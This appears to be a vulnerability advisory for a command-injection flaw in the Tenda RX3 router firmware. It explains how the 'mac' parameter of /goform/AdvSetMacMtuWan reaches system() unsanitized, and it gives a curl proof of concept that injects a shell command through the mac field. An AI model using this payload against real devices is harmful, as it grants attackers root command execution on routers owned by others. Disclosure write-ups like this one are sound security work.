| Firmware Name | Firmware Version    | Download Link |
| ------------- | ------------------- | ------------- |
| RX3           | V16.03.13.11_multi  | https://static.tenda.com.cn/tdeweb/download/RX3/US_RX3V1.0br_V16.03.13.11_multi_TDE01.zip |

## Analysis

In the httpd binary, the function `fromAdvSetMacMtuWan` handles requests to `/goform/AdvSetMacMtuWan`. The `mac` parameter is stored without sanitization. The `multiWAN` binary later uses this value in `doSystemCmd("ifconfig %s hw ether %s")`, which calls `system()`, allowing arbitrary command execution as root.

![Ghidra showing unsanitized mac parameter](screenshots/1.png)

## POC

```
curl -i -X POST http://192.168.0.1/goform/AdvSetMacMtuWan -d "wanMTU=1500&wanSpeed=0&cloneType=manual&mac=AA:BB:CC;id>/tmp/pwned"
```

Response: `{"errCode":0}` — handler accepts the injected MAC address.

![Handler returns errCode:0 with injected payload](screenshots/2.png)
